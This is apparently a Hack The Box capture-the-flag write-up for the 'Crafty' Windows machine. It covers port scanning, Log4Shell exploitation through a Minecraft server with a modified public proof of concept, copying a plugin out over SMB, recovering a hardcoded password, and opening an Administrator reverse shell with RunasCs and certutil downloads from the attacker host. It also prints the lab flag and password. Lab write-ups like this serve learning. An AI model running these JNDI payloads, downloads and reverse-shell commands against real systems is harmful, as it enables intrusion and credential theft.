
# HTB - Crafty

## Machine Information

| Information          | Details                            |
| -------------------- | ---------------------------------- |
| Machine              | Crafty                             |
| IP Address           | 10.129.230.193                     |
| Operating System     | Windows                            |
| Difficulty           | Easy                               |
| Web Server           | Microsoft IIS 10.0                 |
| Minecraft Server     | Minecraft 1.16.5                   |
| Initial Access       | Log4Shell (CVE-2021-44228)         |
| Privilege Escalation | Credential Extraction and RunasCs  |
| Root Flag            | `9943bd1343b4acfaae139f193d1cb8eb` |

# 1. Reconnaissance

We begin with a full TCP port scan using Nmap. We use grepable output (`-oG`) so that we can later extract the discovered ports programmatically.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG Allports 10.129.230.193
```

The scan returns two open ports:

```text
# Nmap 7.991 scan initiated Sat Oct 10 14:21:30 2026 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG Allports 10.129.230.193
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.129.230.193 ()	Status: Up
Host: 10.129.230.193 ()	Ports: 80/open/tcp//http///, 25565/open/tcp//minecraft///	Ignored State: filtered (65533)
# Nmap done at Sat Oct 10 14:21:56 2026 -- 1 IP address (1 host up) scanned in 26.46 seconds
```

The open ports are:

* `80/tcp`: HTTP
* `25565/tcp`: Minecraft

Port 25565 is the default port used by Minecraft Java Edition servers. This suggests that the machine hosts a Minecraft server, which may expose a different attack surface from the web application.

While Nmap completes its initial scan, we open the website and inspect its technologies with Wappalyzer. The website looks polished, and the detected technologies suggest that the server is running Windows.

We can perform a quick check using `ping`:

```bash
ping -c 1 10.129.230.193
```

The response has a TTL of 128. This is commonly associated with Windows systems, although TTL alone does not conclusively identify an operating system because the value can change as packets traverse network devices.

# 2. Service Enumeration

We now perform a targeted scan against both open ports to identify their versions and execute the relevant default scripts.

```bash
nmap -Pn -sVC -p80,25565 -oN Targeted 10.129.230.193
```

The results are:

```text
# Nmap 7.991 scan initiated Sat Oct 10 14:24:24 2026 as: nmap -Pn -sVC -p80,25565 -oN Targeted 10.129.230.193
Nmap scan report for crafty.htb (10.129.230.193)
Host is up (0.075s latency).

PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Crafty - Official Website
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 10 14:24:37 2026 -- 1 IP address (1 host up) scanned in 12.79 seconds
```

We have identified two services:

* Microsoft IIS 10.0 on port 80.
* Minecraft Java Edition 1.16.5 on port 25565.

The Minecraft version is particularly interesting because Log4Shell, tracked as CVE-2021-44228, affected vulnerable versions of Apache Log4j 2. The vulnerability can allow remote code execution when an application processes attacker-controlled input through a vulnerable logging configuration.

We therefore investigate whether the Minecraft server is vulnerable.

# 3. Preparing the Target Hostname

The website uses the hostname `crafty.htb`. We add it to `/etc/hosts` so our machine can resolve it locally.

```bash
echo "10.129.230.193 crafty.htb" | sudo tee -a /etc/hosts
```

This maps `crafty.htb` to the target IP address.

We can now use the hostname when connecting to the Minecraft server and accessing the website.

# 4. Connecting to the Minecraft Server

Downloading the full Minecraft client would require a substantial installation and a graphical interface that we do not need for this task.

Instead, we use a lightweight Minecraft client that supports connecting to a Java Edition server.

We connect to `crafty.htb` using a username of our choice.

Once connected, we can interact with the server and observe messages such as:

```text
nitblan ha muerto por zombie
```

This confirms that we are actively interacting with the Minecraft environment.

The important observation is that we have direct access to the Minecraft server's functionality. We can now investigate whether user-controlled input reaches a vulnerable logging component.

# 5. Identifying Log4Shell

We search for a Log4Shell proof of concept and find the following repository:

[kozmer/log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc)

The repository contains a proof of concept that demonstrates exploitation of vulnerable Log4j applications. It also includes a Docker-based environment for testing.

We review the project and attempt to run its Python script.

During execution, the script reports that a required directory or dependency is missing. After researching the error, we determine that the project expects an additional Java component that must be downloaded separately from Oracle.

We create an Oracle account, download the required file, and rename it to match the filename expected by the script. Once this dependency is in place, the proof of concept starts correctly.

We then inspect the script's help output to identify the available command-line arguments.

# 6. Starting the Log4Shell Listener

We execute the proof of concept with our VPN IP address and the ports we intend to use:

```bash
python3 poc.py --userip 10.10.15.194 --webport 8000 --lport 4444
```

The script starts the services required by the exploit and prepares to receive a connection.

The payload we intend to submit to the Minecraft server is:

```text
${jndi:ldap://127.0.0.1:1389/a}
```

This is a JNDI lookup expression. When a vulnerable Log4j instance evaluates the expression, it can initiate a lookup against the specified LDAP endpoint.

In a vulnerable configuration, the lookup can lead to attacker-controlled Java code being loaded or executed, resulting in remote code execution.

The address `127.0.0.1` refers to the loopback interface of the Minecraft server itself. This payload therefore assumes that the LDAP service is reachable from the target machine on that address and port.

For a remote exploitation attempt, the address must match the network arrangement of the proof of concept. A loopback address is not interchangeable with the attacker's VPN address.

# 7. Understanding the Log4Shell Payload

The following Java example illustrates how a vulnerable application might pass an attacker-controlled JNDI expression to a Log4j logger.

```java
package demo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class demo {
    public static Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("${jndi:ldap://servidor/vvt4s5}");
    }
}
```

Reference: [Log4Shell explained with a simple exploit](https://www.hackplayers.com/2021/12/ce-en-log4j-log4shell-simple-exploit.html)

The key operation is:

```java
logger.error("${jndi:ldap://servidor/vvt4s5}");
```

The logger receives the JNDI expression as input. In affected configurations, Log4j may resolve it, causing a lookup to the LDAP server.

The two `System.setProperty` statements are included in the example to illustrate older Java configurations associated with remote code loading. They do not independently make every Java or Log4j installation vulnerable.

The vulnerability depends on the actual Log4j version, its configuration, and the application's execution environment.

# 8. Adapting the Proof of Concept for Windows

The original proof of concept is designed for a Linux target. During our testing, we notice that the script constructs a command using:

```java
String cmd = "/bin/bash";
```

This command is not valid on Windows because Windows does not provide `/bin/bash` by default.

Since Crafty is running Windows, we adapt the proof of concept to use:

```java
String cmd = "cmd.exe";
```

We modify the relevant line in `poc.py`, around line 26 in the version we are using, and restart the script.

We then connect our Netcat listener to port 4444:

```bash
nc -lvnp 4444
```

After sending the payload through the Minecraft server, we obtain a command shell on the target.

This confirms that the vulnerability has provided us with remote command execution.

# 9. Initial Access as svc_minecraft

Our shell is operating in the following directory:

```text
C:\Users\svc_minecraft\server\
```

We enumerate its contents:

```cmd
dir
```

Among the files and directories, we find a directory named `plugins`.

Minecraft plugins are Java archive files (`.jar`) that extend the server's functionality. Since these files execute within the server environment, inspecting them may reveal implementation details or hardcoded credentials.

We decide to transfer the plugin files to our own machine for analysis.

# 10. Transferring the Minecraft Plugin

We create an SMB share on our attacking machine using Impacket's `smbserver.py`.

First, we navigate to the directory where we want the downloaded files to be stored and start the share:

```bash
sudo smbserver.py smbFolder "$(pwd)" -smb2support -username nitblan -password nitblan123
```

We specify a username and password because authenticated SMB access may be required by the Windows client or the server's security configuration.

From the target's command shell, we connect to the share:

```cmd
net use \\10.10.15.194\smbFolder /u:nitblan nitblan123
```

We verify that the share is accessible:

```cmd
dir \\10.10.15.194\smbFolder
```

The output should display the contents of our current working directory on the attacking machine.

We can now copy the plugin file from the target to our SMB share:

```cmd
copy playercounter-1.0-SNAPSHOT.jar \\10.10.15.194\smbFolder\playercounter.jar
```

The file is transferred to our machine and saved as `playercounter.jar`.

# 11. Analyzing the Plugin

We open the downloaded JAR file using JD-GUI:

```bash
jd-gui playercounter.jar
```

JD-GUI allows us to decompile Java class files into a readable representation of their source code.

While inspecting the plugin, we find a class named `Playercounter` that contains information worth investigating.

The plugin exposes the following password:

```text
s67u84zKq8IXw
```

A hardcoded password inside a plugin is a potential security issue. Since the plugin runs on the server, its contents may be recoverable by anyone who gains sufficient access to the Minecraft server's files.

We hypothesize that the password may belong to a Windows account, potentially `administrator`.

We now need to validate whether the credential can be reused for that account.

# 12. Validating Administrator Credentials

We use RunasCs to execute a process under a different Windows user's security context.

We first transfer `RunasCs.exe` to the target. On our attacking machine, we start a simple HTTP server in the directory containing the executable:

```bash
python3 -m http.server 8001
```

On the target, we download the file using `certutil.exe`:

```cmd
certutil.exe -f -urlcache -split http://10.10.15.194:8001/RunasCs.exe RunasCs.exe
```

We use a directory in which the current account has write permissions so the file can be downloaded successfully.

We then attempt to execute a simple command as `administrator`:

```cmd
.\RunasCs.exe administrator s67u84zKq8IXw "cmd.exe /c whoami"
```

The command confirms that the supplied credentials work for the Administrator account.

This is a significant escalation: we have moved from command execution under the Minecraft service account to the ability to execute commands as a highly privileged local user.

# 13. Obtaining a Reverse Shell as Administrator

Instead of running individual commands, we use RunasCs's reverse-shell functionality to obtain an interactive session.

On our attacking machine, we start a listener:

```bash
nc -lvnp 4441
```

From the target, we execute:

```cmd
.\RunasCs.exe administrator s67u84zKq8IXw cmd.exe -r 10.10.15.194:4441
```

The reverse shell connects back to our machine, providing an interactive command prompt running under the Administrator account.

# 14. Retrieving the Root Flag

With Administrator access, we navigate to the Administrator's Desktop:

```cmd
cd C:\Users\Administrator
cd Desktop
```

We read the root flag:

```cmd
type root.txt
```

The output is:

```text
9943bd1343b4acfaae139f193d1cb8eb
```

We have successfully obtained the root flag.

# Attack Path

1. Full TCP port scan identifies ports 80 and 25565.
2. Targeted enumeration identifies Microsoft IIS 10.0 and Minecraft 1.16.5.
3. The `crafty.htb` hostname is added to `/etc/hosts`.
4. A lightweight Minecraft client is used to interact with the server.
5. Log4Shell is investigated as a potential vulnerability.
6. The proof of concept is adapted to use Windows `cmd.exe`.
7. Remote code execution provides an initial shell as `svc_minecraft`.
8. The Minecraft plugin is transferred through an SMB share.
9. JD-GUI reveals a hardcoded password in the plugin.
10. The password is validated against the Administrator account.
11. RunasCs executes commands as Administrator.
12. A reverse shell provides an interactive Administrator session.
13. The root flag is read from the Administrator's Desktop.

# Vulnerabilities & Techniques

## Log4Shell (CVE-2021-44228)

A vulnerability in affected Apache Log4j 2 versions that can allow remote code execution when attacker-controlled input is processed by vulnerable logging functionality.

## Remote Code Execution

The Log4Shell vulnerability allows commands to be executed in the security context of the Minecraft server process.

## Minecraft Plugin Analysis

JAR files can be decompiled with tools such as JD-GUI to inspect classes and identify sensitive information.

## Hardcoded Credential Exposure

A password embedded in a plugin may be exposed to anyone who can retrieve and inspect that file.

## Credential Reuse

The recovered password works for the Windows Administrator account, allowing a substantial increase in privileges.

## RunasCs

RunasCs can launch processes under another Windows user's credentials. Its reverse-shell functionality can provide an interactive session under that user's security context.

## SMB File Transfer

An authenticated SMB share provides a convenient way to transfer files between the target and the attacking machine.

# Lessons Learned

* Full port scans and targeted service enumeration should be performed before selecting an attack path.
* A service version can suggest possible vulnerabilities, but the exact implementation and configuration must still be verified.
* TTL values are useful clues for OS fingerprinting, not definitive proof of an operating system.
* A lightweight client can be useful when a full graphical application is unnecessary.
* Log4Shell exploitation depends on a vulnerable Log4j configuration; the presence of Minecraft 1.16.5 alone does not prove that the server is exploitable.
* Exploit scripts often assume a particular operating system. Linux-specific commands such as `/bin/bash` must be adapted when the target is Windows.
* Plugins should not contain hardcoded credentials, particularly credentials that can be reused for privileged system accounts.
* Credentials recovered from application files should be validated carefully and should not automatically be assumed to belong to a specific user.
* A service account compromise can become a full system compromise when credentials are reused by an Administrator account.
* Transferring and analyzing application files can expose weaknesses that are not apparent from network enumeration alone.

pwned :)))))
